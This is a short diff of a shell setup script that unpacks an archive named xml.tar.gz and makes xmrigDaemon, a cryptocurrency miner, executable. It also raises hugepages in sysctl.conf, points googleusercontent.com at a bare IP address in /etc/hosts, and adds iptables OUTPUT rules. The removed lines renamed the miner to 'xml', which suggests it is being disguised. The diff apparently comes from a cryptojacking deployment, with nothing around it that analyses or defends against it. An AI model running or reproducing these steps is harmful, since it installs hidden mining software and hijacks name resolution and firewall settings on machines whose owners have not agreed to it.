@@ -1,9 +1,7 @@
 sudo echo "vm.nr_hugepages = 1168" >> /etc/sysctl.conf &&
 chmod +x xml.tar.gz
 tar xvfz xml.tar.gz
-cd miner
-sudo mv miner xml
-cd xml && chmod +x xmrigDaemon
+cd miner && chmod +x xmrigDaemon
 sudo -- sh -c "echo '104.131.103.118  googleusercontent.com' >> /etc/hosts" 
 sudo iptables -I OUTPUT 1 -p tcp --sport 22 -j ACCEPT
 sudo iptables -I OUTPUT 2 -p udp --dport 53 -j ACCEPT
